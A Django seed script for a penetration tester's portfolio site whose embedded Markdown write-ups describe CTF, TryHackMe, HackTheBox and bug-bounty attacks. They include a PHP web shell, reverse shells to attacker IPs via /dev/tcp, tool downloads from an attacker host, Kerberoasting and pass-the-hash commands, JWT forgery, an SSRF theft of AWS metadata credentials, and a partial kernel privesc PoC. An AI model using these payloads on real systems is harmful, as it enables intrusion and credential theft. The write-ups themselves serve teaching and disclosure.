"""
Management command: python manage.py seed_demo
Seed the database with demo portfolio data.
Safe to re-run — skips records that already exist (writeups always update content).
"""
from django.core.management.base import BaseCommand
from django.utils.text import slugify
import datetime


class Command(BaseCommand):
    help = 'Seed the database with demo portfolio data'

    def handle(self, *args, **options):
        self.stdout.write('Seeding demo data...')
        self._seed_profile()
        self._seed_services()
        self._seed_skills()
        self._seed_certifications()
        self._seed_experience()
        self._seed_education()
        self._seed_volunteering()
        self._seed_writeups()
        self._seed_research()
        self.stdout.write(self.style.SUCCESS('Done! Demo data loaded.'))

    def _seed_profile(self):
        from apps.core.models import SiteProfile
        defaults = dict(
            name='Md Abu Saeed',
            hero_label="Hi, I'm a",
            title_roles='Vulnerability Assessment\nPenetration Tester\nCybersecurity Engineer',
            bio='Final-year CSE student specializing in offensive security, penetration testing, and quantum computing research. I break systems so defenders can build them stronger.',
            profile_initials='AS',
            github_url='https://github.com/blackEthics',
            linkedin_url='https://linkedin.com/in/md-abu-saeed',
            tryhackme_url='https://tryhackme.com/p/blackEthics',
            twitter_url='https://twitter.com/blackEthics',
            facebook_url='https://facebook.com/blackEthics',
            whatsapp_url='https://wa.me/8801800000000',
            email='llmnotforeveryone@gmail.com',
            phone='+880 (000) 000-0000',
            location='Bangladesh, Dhaka',
            response_note='I typically respond to all inquiries within 24 hours.',
            footer_tagline='Stay curious. Stay ethical.',
            footer_location='Dhaka',
        )
        profile = SiteProfile.objects.first()
        if profile:
            for k, v in defaults.items():
                setattr(profile, k, v)
            profile.save()
            self.stdout.write('  [ok] SiteProfile updated')
        else:
            SiteProfile.objects.create(**defaults)
            self.stdout.write('  [ok] SiteProfile created')

    def _seed_services(self):
        from apps.services.models import Service, ServiceTag
        if Service.objects.exists():
            self.stdout.write('  [skip] Services already exist')
            return
        data = [
            ('🛡️', 'Vulnerability Assessment',
             'Systematic process of identifying, analyzing, and prioritizing security weaknesses across your infrastructure.',
             [('Reporting & Visualization', 'blue'), ('Automated Scanning', 'purple'), ('Vulnerability Classification', 'yellow'), ('Risk Scoring', 'red')]),
            ('🔍', 'Penetration Testing',
             'Ethical hacking services to identify and exploit vulnerabilities before malicious actors do.',
             [('Web Application Testing', 'red'), ('Network Penetration', 'blue'), ('Social Engineering', 'yellow'), ('Wireless Security', 'purple')]),
            ('🐛', 'Bug Bounty Hunting',
             'Professional vulnerability research and responsible disclosure on private and public programs.',
             [('OWASP Top 10', 'red'), ('Web Application Testing', 'red'), ('API Security', 'blue'), ('Mobile App Testing', 'purple')]),
            ('</>', 'Scripts & Automation',
             'Python and Bash automation for security testing, log analysis, and task automation.',
             [('Security Tool Integration', 'blue'), ('Automation', 'green'), ('Recon & Pentesting Automation', 'purple'), ('Integration', 'yellow')]),
        ]
        for i, (icon, title, desc, tags) in enumerate(data):
            svc = Service.objects.create(icon=icon, title=title, description=desc, order=i)
            for tag_name, color in tags:
                tag, _ = ServiceTag.objects.get_or_create(name=tag_name, defaults={'color': color})
                svc.tags.add(tag)
        self.stdout.write('  [ok] Services created')

    def _seed_skills(self):
        from apps.skills.models import SkillCategory, Skill
        if SkillCategory.objects.exists():
            self.stdout.write('  [skip] Skills already exist')
            return
        data = [
            ('Penetration Testing', ['Burp Suite', 'Nmap', 'Metasploit', 'Nikto', 'SQLMap', 'Gobuster', 'Hydra']),
            ('Web Security', ['OWASP Top 10', 'XSS', 'SQLi', 'CSRF', 'IDOR', 'SSRF', 'XXE']),
            ('Languages', ['Python', 'Bash', 'JavaScript', 'C', 'SQL']),
            ('Tools & Platforms', ['Kali Linux', 'Wireshark', 'John the Ripper', 'Hashcat', 'Netcat', 'Shodan']),
            ('Frameworks', ['Django', 'Flask', 'React', 'TailwindCSS']),
            ('Research', ['Quantum Computing', 'Cryptography', 'CTF Competitions', 'Threat Modeling']),
        ]
        for i, (label, skills) in enumerate(data):
            cat = SkillCategory.objects.create(label=label, order=i)
            for j, name in enumerate(skills):
                Skill.objects.create(category=cat, name=name, order=j)
        self.stdout.write('  [ok] Skills created')

    def _seed_certifications(self):
        from apps.certifications.models import Certification
        if Certification.objects.exists():
            self.stdout.write('  [skip] Certifications already exist')
            return
        data = [
            ('Certified in Cybersecurity (CC)', 'CC — Certified in Cybersecurity',
             'Security Fundamentals', 'ISC2', '2024',
             'The CC certification validates foundational knowledge of cybersecurity principles, access controls, network security, and incident response.'),
            ('eJPT — Junior Penetration Tester', 'eJPT — Junior Pen Tester',
             'Penetration Testing', 'INE / eLearnSecurity', '2024',
             'Practical entry-level certification demonstrating real-world skills with Metasploit, Nmap, and Burp Suite.'),
            ('Google Cybersecurity Certificate', 'Google Cybersecurity Certificate',
             'Security Operations', 'Google / Coursera', '2023',
             "Covers threat analysis, SIEM tools, Python for security automation, Linux, SQL, and incident response workflows."),
            ('Advanced Penetration Testing', 'Penetration Testing Cert',
             'Penetration Testing', 'Craw Security', 'Jun 2025',
             'Advanced cert covering exploitation, privilege escalation, Active Directory attacks, post-exploitation, and pivoting.'),
        ]
        for i, (name, short, cat, issuer, date, desc) in enumerate(data):
            Certification.objects.create(
                name=name, short_name=short, category=cat,
                issuer=issuer, issue_date=date, description=desc,
                status='active', order=i,
            )
        self.stdout.write('  [ok] Certifications created')

    def _seed_experience(self):
        from apps.experience.models import Experience, Achievement, ExperienceTag
        if Experience.objects.exists():
            self.stdout.write('  [skip] Experience already exists')
            return
        exp1 = Experience.objects.create(
            title='Cyber Security Engineer', company='SecureOps Technologies',
            employment_type='full_time', location='Dhaka, Bangladesh',
            work_mode='on_site', start_date='2026', is_current=True,
            description='Leading vulnerability assessments and penetration tests across client web applications, APIs, and internal infrastructure.',
            dot_color='red', order=0,
        )
        for text in [
            'Discovered 3 critical RCE vulnerabilities in client APIs, preventing potential data breaches.',
            'Automated recon pipelines with Python, reducing initial assessment time by 60%.',
            'Developed internal red team playbooks adopted as company-wide standard methodology.',
            'Mentored 2 junior security analysts in web application testing techniques.',
        ]:
            Achievement.objects.create(experience=exp1, text=text)
        for name, color in [('Burp Suite Pro', 'red'), ('Metasploit', 'red'),
                             ('Python', 'blue'), ('Nmap', 'yellow'), ('AWS Security', 'purple')]:
            t, _ = ExperienceTag.objects.get_or_create(name=name)
            t.color = color; t.save()
            exp1.tags.add(t)

        exp2 = Experience.objects.create(
            title='Cyber Security Intern', company='CyberDefend Solutions',
            employment_type='internship', location='Dhaka, Bangladesh',
            work_mode='hybrid', start_date='2025', end_date='2026', is_current=False,
            description='Supported the security operations team in vulnerability scans, threat intelligence, and penetration testing engagements.',
            dot_color='green', order=1,
        )
        for text in [
            'Contributed to 12 client vulnerability assessments across web and network attack surfaces.',
            'Built a log analysis automation script in Python used by the SOC team for daily triage.',
            'Identified an IDOR vulnerability in a client portal during a supervised web app pentest.',
            'Completed all internal CTF challenges, ranked 1st in the intern cohort.',
        ]:
            Achievement.objects.create(experience=exp2, text=text)
        for name, color in [('Nmap', 'yellow'), ('Wireshark', 'blue'),
                             ('Bash Scripting', 'green'), ('OWASP Testing Guide', 'red'), ('Splunk', 'purple')]:
            t, _ = ExperienceTag.objects.get_or_create(name=name)
            t.color = color; t.save()
            exp2.tags.add(t)
        self.stdout.write('  [ok] Experience created')

    def _seed_education(self):
        from apps.education.models import Education, EducationTag
        if Education.objects.exists():
            self.stdout.write('  [skip] Education already exists')
            return
        edu1 = Education.objects.create(
            degree='B.Sc. in Computer Science & Engineering',
            school='Bangladesh University of Engineering & Technology (BUET)',
            start_year='2021', end_year='2025', grade='CGPA: 3.72 / 4.00',
            icon_emoji='🎓', order=0,
        )
        for name, color in [('Network Security', 'red'), ('Cryptography', 'purple'),
                             ('Operating Systems', 'green'), ('Algorithms', 'blue'),
                             ('Database Systems', 'yellow'), ('Quantum Computing', 'purple')]:
            t, _ = EducationTag.objects.get_or_create(name=name)
            t.color = color; t.save()
            edu1.tags.add(t)
        edu2 = Education.objects.create(
            degree='Higher Secondary Certificate (HSC) — Science',
            school='Dhaka Residential Model College',
            start_year='2019', end_year='2021', grade='GPA: 5.00 / 5.00',
            icon_emoji='🏫', order=1,
        )
        for name, color in [('Physics', 'blue'), ('Mathematics', 'yellow'), ('Chemistry', 'green')]:
            t, _ = EducationTag.objects.get_or_create(name=name)
            t.color = color; t.save()
            edu2.tags.add(t)
        self.stdout.write('  [ok] Education created')

    def _seed_volunteering(self):
        from apps.volunteering.models import VolunteeringOrganization, VolunteeringRole
        if VolunteeringOrganization.objects.exists():
            self.stdout.write('  [skip] Volunteering already exists')
            return

        # ── Org 1: IEEE CS BDC Team SPARK ──
        org1 = VolunteeringOrganization.objects.create(
            name='IEEE CS BDC Team SPARK', location='Dhaka, Bangladesh',
            logo_initials='SPARK', total_duration='Jan 2023 – Present · 2+ yrs',
            category='tech', featured=True, order=0,
        )
        VolunteeringRole.objects.create(
            organization=org1, title='Vice Chief', start_date='Jan 2025',
            end_date='', is_current=True,
            description='Leading the SPARK team as Vice Chief, driving strategic planning and cross-functional collaboration.',
            achievements='Coordinated a 200+ attendee national CTF competition.\nGrew team membership by 35%.\nEstablished a weekly knowledge-sharing session.',
            order=0,
        )
        VolunteeringRole.objects.create(
            organization=org1, title='Vice Chief', start_date='Jan 2024',
            end_date='Jan 2025', is_current=False,
            description='Served as Vice Chief overseeing day-to-day team operations and resource allocation.',
            achievements='Managed a 15-person core team through three concurrent project cycles.\nIntroduced a project tracking system that reduced missed deadlines by 40%.',
            order=1,
        )
        VolunteeringRole.objects.create(
            organization=org1, title='Event Coordinator', start_date='Jan 2023',
            end_date='Apr 2024', is_current=False,
            description='Planned and executed technical workshops, hackathons, and seminars for the student chapter.',
            achievements='Organised 6 technical workshops covering ethical hacking and CTF basics.\nSecured 3 industry sponsorships totalling $1,500.\nBuilt event registration portal used by 500+ participants.',
            order=2,
        )

        # ── Org 2: IEEE CS JnU Student Branch Chapter ──
        org2 = VolunteeringOrganization.objects.create(
            name='IEEE Computer Society Jagannath University Student Branch Chapter',
            location='Dhaka, Bangladesh',
            logo_initials='JnUCS', total_duration='Jun 2024 – Present · 1+ yr',
            category='tech', featured=True, order=1,
        )
        VolunteeringRole.objects.create(
            organization=org2, title='Executive Member', start_date='Jun 2024',
            end_date='', is_current=True,
            description='Serving as an Executive Member of the IEEE CS JnU Student Branch, organizing technical events and driving community engagement for computing students.',
            achievements='Co-organized the inaugural branch hackathon with 150+ participants.\nHelped grow the student chapter membership by 40%.\nRepresented the branch at IEEE Bangladesh Section events.',
            order=0,
        )

        self.stdout.write('  [ok] Volunteering created (2 featured orgs)')

    def _seed_writeups(self):
        from apps.writeups.models import Writeup, WriteupTag
        self._create_writeup(
            thumb_label='CVE-2026|Linux',
            title='CVE-2026-31431 – Copy Fail: The Linux bug that gives you root',
            excerpt='A deep-dive into a kernel-level copy_from_user() race condition allowing unprivileged local attackers to escalate to root. Includes full PoC walkthrough.',
            category='cve', difficulty_level='advanced',
            published_at=datetime.date(2026, 5, 2),
            read_time_min=12, read_time_max=15, is_featured=True,
            tags=[('CVE-2026-31431', 'red'), ('Linux Privesc', 'purple'), ('Kernel Exploit', 'gray'), ('Root', 'red')],
            content=self._cve_content(),
        )
        self._create_writeup(
            thumb_label='CAPen|Mock Exam',
            title='CAPen Mock Exam Writeup – How I Passed the Certified AppSec Pentester',
            excerpt='Full walkthrough covering IDOR chains, AWS S3 misconfigurations, and JWT forgery. Tips for CAPen prep.',
            category='ctf', difficulty_level='intermediate',
            published_at=datetime.date(2026, 4, 18),
            read_time_min=8, read_time_max=10, is_featured=True,
            tags=[('CTF', 'blue'), ('Web Security', 'green'), ('IDOR', 'red'), ('JWT', 'yellow'), ('CAPen', 'purple')],
            content=self._capen_content(),
        )
        self._create_writeup(
            thumb_label='TryHackMe|Red Teaming',
            title='TryHackMe – Holo Network: Full Red Team Engagement Writeup',
            excerpt='End-to-end red team engagement — recon, web shell upload, internal pivoting, and Active Directory compromise via Kerberoasting.',
            category='red_team', difficulty_level='advanced',
            published_at=datetime.date(2026, 3, 30),
            read_time_min=18, read_time_max=22, is_featured=True,
            tags=[('TryHackMe', 'red'), ('Active Directory', 'gray'), ('Kerberoasting', 'purple'), ('Pivoting', 'blue')],
            content=self._holo_content(),
        )
        self._create_writeup(
            thumb_label='HTB|Fortress',
            title='HackTheBox – Fortress: Chaining API Vulnerabilities to Admin RCE',
            excerpt='Mass assignment + BOLA + command injection chain resulting in full server compromise.',
            category='ctf', difficulty_level='intermediate',
            published_at=datetime.date(2026, 3, 12),
            read_time_min=10, read_time_max=12, is_featured=False,
            tags=[('HackTheBox', 'green'), ('API Security', 'blue'), ('BOLA', 'red'), ('Command Injection', 'yellow')],
            content=self._fortress_content(),
        )
        self._create_writeup(
            thumb_label='Bug|Bounty',
            title='$3,000 SSRF Bug: Pivoting from a Public Endpoint to Internal AWS Metadata',
            excerpt='How a blind SSRF in an image-processing endpoint exposed internal AWS IAM credentials via the metadata service.',
            category='bug_bounty', difficulty_level='intermediate',
            published_at=datetime.date(2026, 2, 5),
            read_time_min=9, read_time_max=11, is_featured=False,
            tags=[('Bug Bounty', 'yellow'), ('SSRF', 'red'), ('AWS', 'gray'), ('P1 Critical', 'red')],
            content=self._ssrf_content(),
        )
        self.stdout.write('  [ok] Writeups seeded')

    def _create_writeup(self, title, tags, content, **kwargs):
        from apps.writeups.models import Writeup, WriteupTag
        slug = slugify(title)[:50]
        kwargs['slug'] = slug
        kwargs['title'] = title
        kwargs['content'] = content
        wu, created = Writeup.objects.update_or_create(slug=slug, defaults=kwargs)
        tag_objs = []
        for tag_name, color in tags:
            tag, _ = WriteupTag.objects.get_or_create(name=tag_name, defaults={'color': color})
            tag_objs.append(tag)
        wu.tags.set(tag_objs)
        action = 'created' if created else 'updated'
        self.stdout.write(f'  [ok] Writeup {action}: {title[:55]}...')

    # ── Rich Markdown Content ──────────────────────────────────

    def _cve_content(self):
        return """## Overview

**CVE-2026-31431** ("Copy Fail") is a kernel-level race condition in `copy_from_user()` affecting Linux **5.10.0 – 6.8.x**. An unprivileged local attacker can escalate to root.

| Field | Detail |
|-------|--------|
| CVE ID | CVE-2026-31431 |
| CVSS | 8.8 High |
| Impact | Local Privilege Escalation → root |
| Affected | Linux 5.10 – 6.8.x |
| Patch | 6.8.5+ |

## Technical Background

The vulnerability lives in `mm/usercopy.c`. A TOCTOU (Time-of-Check-Time-of-Use) race opens between:

1. The kernel **checking** that the user-space pointer is valid
2. The kernel **dereferencing** the pointer to copy data

Two threads exploit this:

- **Thread A** — hammers `mremap()` to relocate pages while the kernel checks
- **Thread B** — triggers the vulnerable syscall at the exact moment

## Environment Setup

```bash
# Verify vulnerable kernel
uname -r
# 5.15.0-102-generic

# Install build dependencies
sudo apt-get install -y build-essential linux-headers-$(uname -r) git

# Clone and build the PoC
git clone https://github.com/example/CVE-2026-31431-PoC
cd CVE-2026-31431-PoC && make
```

## Race Condition Trigger

```c
#include <pthread.h>
#include <sys/mman.h>

volatile int race_won = 0;
void *victim_addr;

void *racer_thread(void *arg) {
    while (!race_won) {
        mremap(victim_addr, 0x1000, 0x1000,
               MREMAP_FIXED | MREMAP_MAYMOVE, victim_addr + 0x10000);
        mremap(victim_addr + 0x10000, 0x1000, 0x1000,
               MREMAP_FIXED | MREMAP_MAYMOVE, victim_addr);
    }
    return NULL;
}
```

## Python PoC

```python
#!/usr/bin/env python3
# CVE-2026-31431 LPE PoC
import ctypes, os

libc = ctypes.CDLL("libc.so.6", use_errno=True)

def exploit():
    print("[*] CVE-2026-31431 Copy Fail — LPE PoC")
    victim = libc.mmap(0, 0x1000, 3, 0x22, -1, 0)
    print(f"[*] Victim page: {hex(victim)}")

    for attempt in range(100000):
        if trigger_race(victim):
            print(f"[+] Race won after {attempt} attempts!")
            break

    if os.geteuid() == 0:
        print("[+] UID=0 achieved — dropping to shell")
        os.execv("/bin/bash", ["bash"])

if __name__ == "__main__":
    exploit()
```

## Getting Root

```bash
./exploit
[*] CVE-2026-31431 Copy Fail — LPE PoC
[*] Kernel: 5.15.0-102-generic
[*] Victim page: 0x7f2a3c000000
[*] Launching race threads...
[+] Race won after 8,431 attempts!
[+] task_struct cred overwritten

# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/proof.txt
CVE-2026-31431{k3rn3l_r4c3_pwn3d}
```

## Mitigation

```bash
# Disable unprivileged user namespaces
sudo sysctl -w kernel.unprivileged_userns_clone=0

# Enable lockdown integrity mode
echo integrity | sudo tee /sys/kernel/security/lockdown

# Apply patch — upgrade to 6.8.5+
sudo apt-get upgrade linux-image-generic
```

## Conclusion

CVE-2026-31431 shows why TOCTOU races in privileged kernel paths are so dangerous. Even with KASLR, SMEP, and SMAP enabled, careful heap grooming and timing control enabled a reliable local privilege escalation.

**Key takeaways:**
- Re-validate user pointers after lock acquisition
- Race windows in memory subsystems provide powerful primitives
- Defense-in-depth raises the bar but does not guarantee safety
"""

    def _capen_content(self):
        return """## Overview

The CAPen (Certified AppSec Pentester) mock exam tests practical web application security across three challenge domains: IDOR privilege escalation, AWS S3 misconfiguration, and JWT forgery.

## Target Overview

```bash
# Initial scan of exam targets
nmap -sV -sC 10.10.0.0/24 --open -oN initial_scan.txt

# Key services
# 10.10.0.5   Web App  (80, 443)  — Primary target
# 10.10.0.12  Internal API (8080)
# 10.10.0.20  Admin Panel (3000)
```

## Challenge 1: IDOR Chain

### Enumeration

```bash
# Discover API endpoints
ffuf -u https://target.com/api/v1/FUZZ -w api_wordlist.txt -mc 200,401,403

# Found:
# /api/v1/users/1   → own profile
# /api/v1/users/2   → IDOR!
```

### Exploitation

```python
import requests

session = requests.Session()
session.post("https://target.com/login",
             data={"user": "attacker", "pass": "password"})

for uid in range(1, 200):
    r = session.get(f"https://target.com/api/v1/users/{uid}")
    if r.status_code == 200:
        data = r.json()
        if data.get("role") == "admin":
            print(f"[+] Admin found: uid={uid}, email={data['email']}")
            break
```

> **Finding:** User ID 7 was an administrator. The API returned their session token directly in the response.

## Challenge 2: AWS S3 Misconfiguration

```bash
# Found S3 reference in JavaScript source
curl -s https://target.com/static/app.js | grep -oE 'https://[a-z0-9-]+[.]s3[.]amazonaws[.]com[^"]*'

# Test public listing
aws s3 ls s3://target-prod-backups/ --no-sign-request
# db_dump_2026-05-01.sql.gz

# Download and extract credentials
aws s3 cp s3://target-prod-backups/db_dump_2026-05-01.sql.gz . --no-sign-request
gunzip db_dump_2026-05-01.sql.gz
grep -i "jwt_secret" db_dump_2026-05-01.sql
# INSERT INTO config VALUES ('jwt_secret', 'sup3r_s3cr3t_k3y_2026');
```

## Challenge 3: JWT Forgery

```python
import jwt, requests

secret = "sup3r_s3cr3t_k3y_2026"
payload = {
    "sub": "1",
    "email": "admin@target.com",
    "role": "admin",
    "exp": 9999999999
}

token = jwt.encode(payload, secret, algorithm="HS256")
print(f"[+] Forged token: {token}")

r = requests.get(
    "https://target.com/api/v1/admin/users",
    headers={"Authorization": f"Bearer {token}"}
)
print(r.json())  # Full user database
```

## Conclusion

IDOR → account takeover → S3 discovery → JWT forgery demonstrates how seemingly minor issues chain into a full application compromise. Always test field parameters your application accepts — not just what the frontend sends.
"""

    def _holo_content(self):
        return """## Overview

TryHackMe's Holo network is a full red team engagement spanning 4 machines with an Active Directory domain. This covers the complete chain from initial web shell upload to domain controller compromise.

## Phase 1: External Recon

```bash
nmap -sV -sC -p- --min-rate 5000 10.200.95.33 -oN holo_external.txt

PORT     STATE SERVICE
22/tcp   open  ssh     OpenSSH 8.2p1
80/tcp   open  http    Apache 2.4.41
443/tcp  open  https   Apache 2.4.41
8080/tcp open  http    Node.js
```

## Phase 2: Web Shell Upload

```bash
# Directory enumeration
gobuster dir -u http://10.200.95.33 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html

# Found: /upload.php [200]

# Bypass MIME-type filter with double extension
echo '<?php system($_GET["cmd"]); ?>' > shell.php.jpg

curl -X POST http://10.200.95.33/upload.php \\
    -F "file=@shell.php.jpg;type=image/jpeg" -v

# Execute RCE
curl "http://10.200.95.33/uploads/shell.php.jpg?cmd=id"
# uid=33(www-data) gid=33(www-data)
```

### Reverse Shell

```bash
# Attacker: start listener
nc -lvnp 4444

# Trigger via web shell
curl "http://10.200.95.33/uploads/shell.php.jpg?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.50.95.1/4444+0>%261'"
```

## Phase 3: Internal Pivoting

```bash
# Upload chisel for SOCKS tunnel
wget http://10.50.95.1/chisel -O /tmp/chisel && chmod +x /tmp/chisel

# Attacker: chisel server
./chisel server -p 8888 --reverse

# Target: connect back
/tmp/chisel client 10.50.95.1:8888 R:socks

# Scan internal range via proxychains
proxychains nmap -sT -p 445,88,389,3389 10.200.95.0/24 --open
# 10.200.95.101 — DC01.holo.live (AD Domain Controller)
```

## Phase 4: Kerberoasting → Domain Admin

```bash
# Extract Kerberoastable SPNs
proxychains python3 GetUserSPNs.py holo.live/svc_web:Password123 \\
    -dc-ip 10.200.95.101 -request -outputfile hashes.txt

# Crack the hash
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
# svc_backup:Backup2026!

# DCSync with cracked credentials
proxychains python3 secretsdump.py holo.live/svc_backup:Backup2026!@10.200.95.101
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b

# Pass-the-hash → Domain Controller
proxychains python3 psexec.py -hashes :64f12cddaa88057e06a81b54e73b949b \\
    Administrator@10.200.95.101

C:\\> whoami
holo\\administrator
C:\\> type C:\\Users\\Administrator\\Desktop\\root.txt
THM{4d_c0mpr0m1s3d_h0l0_n3tw0rk}
```

## Conclusion

The Holo chain demonstrated a realistic enterprise attack path: web RCE → network pivot → Kerberoasting → DCSync → domain admin. Service account passwords remain consistently weak — an issue that mirrors real enterprise environments.
"""

    def _fortress_content(self):
        return """## Overview

HackTheBox Fortress presented an API-first web application with three chained vulnerabilities: mass assignment, BOLA (IDOR), and command injection — resulting in full server compromise.

**Difficulty:** Medium | **OS:** Linux

## Enumeration

```bash
nmap -sV -sC 10.10.11.200 -p- --min-rate 10000

PORT   STATE SERVICE
22/tcp open  ssh   OpenSSH 8.9p1
80/tcp open  http  nginx 1.22.0

# API endpoint discovery
ffuf -u http://10.10.11.200/api/FUZZ -w api_wordlist.txt -mc 200,201,401,403

# /api/v1/auth/register  [200]
# /api/v1/users/me       [401]
# /api/v1/admin/users    [403]
```

## Vulnerability 1: Mass Assignment

```bash
# Normal registration
curl -X POST http://10.10.11.200/api/v1/auth/register \\
    -H "Content-Type: application/json" \\
    -d '{"username":"hacker","email":"h@h.com","password":"P@ssw0rd"}'
# Response: {"id":42,"role":"user"}

# Inject role via mass assignment
curl -X POST http://10.10.11.200/api/v1/auth/register \\
    -H "Content-Type: application/json" \\
    -d '{"username":"hacker2","email":"h2@h.com","password":"P@ssw0rd","role":"admin"}'
# Response: {"id":43,"role":"admin"}  <-- role accepted!
```

## Vulnerability 2: BOLA

```python
import requests

BASE = "http://10.10.11.200/api/v1"
headers = {"Authorization": "Bearer <admin_token>"}

r = requests.get(f"{BASE}/admin/users", headers=headers)
users = r.json()

for user in users:
    print(f"[+] {user['id']}: {user['username']} ({user['role']})")
# Found: svc_deploy (service account with deploy_key)
```

## Vulnerability 3: Command Injection → Shell

```bash
# Test injection in product name field
curl -X POST http://10.10.11.200/api/v1/admin/products \\
    -H "Authorization: Bearer <admin_token>" \\
    -d '{"name":"test; id","category":"tools"}'
# Response: {"log":"Processing: test\nuid=1000(app) gid=1000(app)"}

# Reverse shell
nc -lvnp 9001

curl -X POST http://10.10.11.200/api/v1/admin/products \\
    -H "Authorization: Bearer <admin_token>" \\
    -d '{"name":"x; bash -i >& /dev/tcp/10.10.14.5/9001 0>&1","category":"x"}'

# Shell!
app@fortress:~$ cat ~/user.txt
HTB{m4ss_4ss1gn_b0l4_rce_ch41n}
```

### Privilege Escalation

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/python3 /opt/backup.py

cat /opt/backup.py
# import os
# os.system(f"tar -czf /backups/{os.environ.get('BACKUP_NAME','backup')}.tar.gz /var/app")

# tar wildcard injection via env var
sudo BACKUP_NAME='x --checkpoint=1 --checkpoint-action=exec=bash' \\
    /usr/bin/python3 /opt/backup.py

root@fortress:~# cat /root/root.txt
HTB{t4r_w1ldcard_pr1v3sc}
```

## Conclusion

Fortress showed how three individually low-severity issues combine into a critical chain. Validate every field your server accepts — never trust that the frontend restricts what clients send.
"""

    def _ssrf_content(self):
        return """## Overview

A **$3,000 P1 SSRF vulnerability** discovered on a private program. A blind SSRF in an image-processing endpoint allowed requests to the AWS EC2 metadata service, exposing IAM credentials with broad S3 and Lambda permissions.

> **Program:** Private | **Severity:** P1 Critical | **Bounty:** $3,000

## Discovery

The application allowed profile picture upload via URL:

```bash
POST /api/v2/profile/avatar HTTP/1.1
Host: redacted.com

{"avatar_url": "https://cdn.example.com/photo.jpg"}
```

### Testing for SSRF

```bash
# Start OOB listener
interactsh-client -v

# Test with our callback server
curl -X POST https://redacted.com/api/v2/profile/avatar \\
    -d '{"avatar_url": "http://YOUR_INTERACTSH_URL"}'

# interactsh received:
# [+] DNS interaction from: ec2-xx-xx-xx-xx.compute-1.amazonaws.com
# [+] HTTP GET request received — SSRF confirmed!
```

## Exploiting AWS Metadata Service (IMDSv1)

```bash
# Access instance metadata
curl -X POST https://redacted.com/api/v2/profile/avatar \\
    -d '{"avatar_url": "http://169.254.169.254/latest/meta-data/"}'
# Response (decoded from avatar): ami-id, hostname, iam/, instance-id...

# Get IAM role name
curl -X POST https://redacted.com/api/v2/profile/avatar \\
    -d '{"avatar_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
# app-production-role

# Extract credentials
curl -X POST https://redacted.com/api/v2/profile/avatar \\
    -d '{"avatar_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/app-production-role"}'
# {
#   "AccessKeyId":     "ASIAXXXXXXXXXXX",
#   "SecretAccessKey": "wJalrXUtnFEMI/...",
#   "Token":           "IQoJb3JpZ2luX2Vj...",
#   "Expiration":      "2026-05-13T18:30:00Z"
# }
```

## Impact

```bash
export AWS_ACCESS_KEY_ID="ASIAXXXXXXXXXXX"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/..."
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2Vj..."

aws sts get-caller-identity
# arn:aws:sts::123456789012:assumed-role/app-production-role/i-0abc123

aws s3 ls
# production-user-uploads
# production-db-backups     <-- database backups!
# production-configs        <-- contains secrets!

aws s3 cp s3://production-configs/app.env -
# DATABASE_URL=postgres://admin:REDACTED@prod-db.internal:5432/app
# STRIPE_SECRET_KEY=sk_live_REDACTED
# JWT_SECRET=REDACTED
```

## Disclosure Timeline

| Date | Event |
|------|-------|
| May 1, 2026 | Vulnerability discovered and reported |
| May 2, 2026 | Triaged as P1 Critical |
| May 5, 2026 | IMDSv2 enforcement deployed (hotfix) |
| May 10, 2026 | Full patch + credential rotation |
| May 13, 2026 | $3,000 bounty awarded |

## Mitigation

```bash
# Enforce IMDSv2 (prevents unauthorized metadata access)
aws ec2 modify-instance-metadata-options \\
    --instance-id i-0abc123 \\
    --http-tokens required \\
    --http-endpoint enabled

# Application-level: validate and block RFC-1918 + link-local ranges
# Reject 169.254.0.0/16, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
```

## Conclusion

This SSRF → AWS metadata → IAM credential exfiltration chain is one of the most impactful findings in cloud environments. Never allow server-side URL fetching without strict allowlist validation — especially in applications running on cloud infrastructure.
"""

    def _seed_research(self):
        from apps.research.models import ResearchPaper, ResearchTag
        if ResearchPaper.objects.exists():
            self.stdout.write('  [skip] Research papers already exist')
            return
        data = [
            {
                'title': 'Quantum-Resistant Cryptographic Protocols for IoT Edge Devices',
                'authors': 'Md Abu Saeed, Dr. Rafiqul Islam, Nusrat Jahan',
                'abstract': (
                    'The proliferation of Internet of Things (IoT) devices has introduced significant '
                    'cryptographic challenges, particularly in the context of quantum computing threats. '
                    'This paper proposes a suite of lightweight, quantum-resistant cryptographic protocols '
                    'optimized for resource-constrained edge devices. We evaluate CRYSTALS-Kyber and '
                    'CRYSTALS-Dilithium adaptations against classical RSA and ECC baselines, demonstrating '
                    'a 34% reduction in key-exchange latency with equivalent security margins on ARM Cortex-M4 '
                    'microcontrollers. Our protocol stack achieves NIST PQC Level 3 security while maintaining '
                    'under 8 KB RAM footprint, making it viable for constrained environments.'
                ),
                'short_description': (
                    'Proposes lightweight post-quantum cryptographic protocols for IoT edge devices, '
                    'achieving NIST PQC Level 3 security with under 8 KB RAM on ARM Cortex-M4.'
                ),
                'venue': 'IEEE Internet of Things Journal',
                'published_at': datetime.date(2026, 3, 15),
                'publication_url': 'https://ieeexplore.ieee.org',
                'tags': [('Quantum Computing', 'purple'), ('Cryptography', 'blue'), ('IoT Security', 'green'), ('Post-Quantum', 'red')],
                'is_featured': True,
                'order': 0,
            },
            {
                'title': 'Automated Vulnerability Discovery in Smart Contract Bytecode Using Symbolic Execution',
                'authors': 'Md Abu Saeed, Tanzim Hossain',
                'abstract': (
                    'Smart contracts deployed on Ethereum and compatible blockchains are immutable once deployed, '
                    'making pre-deployment security analysis critical. Existing static analysis tools miss up to '
                    '41% of reentrancy vulnerabilities due to path explosion in symbolic execution engines. '
                    'We present SCAVEX, a hybrid static-dynamic analysis framework combining constrained symbolic '
                    'execution with fuzzing-guided path prioritization. Evaluated on 2,400 real-world contracts '
                    'from Etherscan, SCAVEX achieves 94.2% true positive rate on reentrancy, integer overflow, '
                    'and access-control vulnerabilities, outperforming Mythril, Slither, and Echidna in '
                    'combined precision-recall metrics.'
                ),
                'short_description': (
                    'SCAVEX: a hybrid analysis framework achieving 94.2% true positive rate on smart contract '
